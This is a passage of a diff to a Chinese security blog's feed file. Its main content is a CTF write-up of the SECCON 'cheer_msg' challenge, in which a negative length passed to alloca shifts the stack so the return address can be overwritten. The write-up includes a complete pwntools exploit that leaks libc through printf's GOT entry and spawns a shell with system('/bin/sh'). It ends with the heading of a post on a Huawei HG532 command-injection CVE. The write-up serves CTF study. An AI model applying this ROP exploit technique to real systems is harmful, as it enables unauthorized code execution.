+<p>一切都很正常，没有溢出，没有格式化字符串漏洞。</p>
+<p>程序的漏洞在于传入的 <code>buf</code> 是通过 <code>alloca</code> 分配的内存，我们可以通过输入 负数 使得 <code>alloca</code>的参数为负， 这样我们就可以把 <code>esp</code> 往栈底移动，栈底有<strong>返回地址</strong>, 然后通过 <code>message</code>  中读取数据，覆盖 <code>eip</code> 然后进行 <code>rop</code> 即可。</p>
+<p>要触发漏洞我们需要输入负数，所以在 </p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515162118968n3v5nlzd.png?imageslim" alt="paste image"><br>会直接返回，不会获取输入，因为它里面调用的是 <code>fgets</code>来获取输入。<code>fgets</code>会有检查。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515162247314nycp4hlw.png?imageslim" alt="paste image"></p>
+<p>所以我们只能往 <code>message</code> 函数内的缓冲区 <code>t_buf</code>写数据，不过这个缓冲区也是在栈上，同样与 <code>esp</code> 相关，所以我们把<code>esp</code> 往栈底移时，它也是会跟着下移，通过它也可以写 <code>返回地址</code> 的值。</p>
+<p>我们可以输入 <code>-140</code>(这个值可以通过 先输入一个 比较小的比如 <code>-32</code>, 然后计算最后得到的数据的地址距离返回地址位置的距离，来继续调整)</p>
+<p>在 <code>0x0804860E</code> 设个断点</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515164055082ht6doej3.png?imageslim" alt="paste image"></p>
+<p><code>sub</code> 之后<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515164096301tgle7wih.png?imageslim" alt="paste image"></p>
+<p>可以看到 <code>esp</code> 已经增大。<br>然后加上一定的 <code>padding</code> (可以使用 <code>pwntools</code> 的 <code>cyclic</code> 计算) ，就能修改 返回地址了。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515164574183kx3lzgi2.png?imageslim" alt="paste image"></p>
+<p>之后就是正常的 <code>rop</code></p>
+<hr>
+<p>使用 <code>printf</code> 打印 <code>got</code> 表中的 <code>printf</code> 的值，泄露 <code>libc</code> 的地址。然后回到程序的开始，再次触发漏洞， 调用 <code>system(&quot;sh&quot;)</code></p>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>alloca</code> 的细节要注意， 注意输入的数据是有符号的还是无符号的。对于后面计算偏移，可以先动态调试计算一个粗略的值，然后使用 <code>cyclic</code> 确定精确的偏移。</p>
+<p><strong>exp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</div><div class="line">r = process(&quot;./cheer_msg&quot;)</div><div class="line"></div><div class="line">binary = ELF(&apos;cheer_msg&apos;)</div><div class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc-2.23.so&apos;)</div><div class="line"></div><div class="line">gdb.attach(r, &apos;&apos;&apos;</div><div class="line">bp 0x0804868B</div><div class="line">bp 0x08048610</div><div class="line">	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">r.recvuntil(&quot;Length &gt;&gt; &quot;)</div><div class="line">r.sendline(&quot;-140&quot;)</div><div class="line">r.recvuntil(&quot;Name &gt;&gt; &quot;)</div><div class="line"></div><div class="line">payload = &quot;a&quot; * 0x10 # padding</div><div class="line">payload += p32(binary.symbols[&apos;printf&apos;])</div><div class="line">payload += p32(binary.entry)  # ret to start</div><div class="line">payload += p32(binary.got[&apos;printf&apos;])</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line"></div><div class="line">r.recvuntil(&quot;Message :&quot;)</div><div class="line">r.recv(1)</div><div class="line">r.recv(1)</div><div class="line">printf_addr = u32(r.recv(4))</div><div class="line">libc_base = printf_addr - libc.symbols[&apos;printf&apos;]</div><div class="line">sh = libc_base + libc.search(&quot;/bin/sh\x00&quot;).next()</div><div class="line">system = libc_base + libc.symbols[&apos;system&apos;]</div><div class="line"></div><div class="line">log.info(&quot;got system: &quot; + hex(system))</div><div class="line">log.info(&quot;got base: &quot; + hex(libc_base))</div><div class="line">log.info(&quot;get sh &quot; + hex(sh))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(&quot;Length &gt;&gt; &quot;)</div><div class="line">r.sendline(&quot;-140&quot;)</div><div class="line">r.recvuntil(&quot;Name &gt;&gt; &quot;)</div><div class="line"></div><div class="line">payload = &quot;a&quot; * 0x10 # padding</div><div class="line">payload += p32(system)</div><div class="line">payload += p32(binary.entry)</div><div class="line">payload += p32(sh)</div><div class="line">r.sendline(payload)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg" target="_blank" rel="external">https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> pwn_router_os </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> alloca </tag>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[CVE-2017-17215 - 华为HG532命令注入漏洞分析]]></title>
       <url>/2017/12/28/cve_2017_17215_hg532.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面几天国外有个公司发布了该漏洞的详情。入手的二手 <code>hg532</code> 到货了，分析测试一下。</p>
